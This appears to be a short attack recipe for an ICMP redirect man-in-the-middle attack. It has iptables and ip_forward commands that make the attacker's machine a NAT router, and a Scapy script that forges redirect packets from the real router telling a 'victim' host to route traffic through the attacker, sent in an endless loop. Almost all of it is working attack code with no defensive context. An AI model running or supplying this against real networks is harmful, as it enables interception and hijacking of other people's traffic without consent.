### Configure your Machine to Perform IP Masquerading
Issuing the following commands will let you configure your machine as a router NATting your victim address and hiding it from the router:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 10.100.13.0/255.255.255.0 -o eth1 -j MASQUERADE
```

### Script
```python
# Creating and sending ICMP redirect packets
originalRouterIP='<The router IP address>'
attackerIP='<Attacker IP Address>'
victimIP='<The Victim IP Address>'
serverIP='<The Web Server IP Address>'
# We create an ICMP Redirect packet
ip=IP()
ip.src=originalRouterIP
ip.dst=victimIP
icmpRedirect=ICMP()
icmpRedirect.type=5
icmpRedirect.code=1
icmpRedirect.gw=attackerIP
# The ICMP packet payload /should/ contain the original TCP SYN packet
# sent from the victimIP
redirPayloadIP=IP()
redirPayloadIP.src=victimIP
redirPayloadIP.dst=serverIP
fakeOriginalTCPSYN=TCP()
fakeOriginalTCPSYN.flags="S"
fakeOriginalTCPSYN.dport=80
fakeOriginalTCPSYN.seq=444444444
fakeOriginalTCPSYN.sport=55555
while True:
    send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)
# Press <enter>
```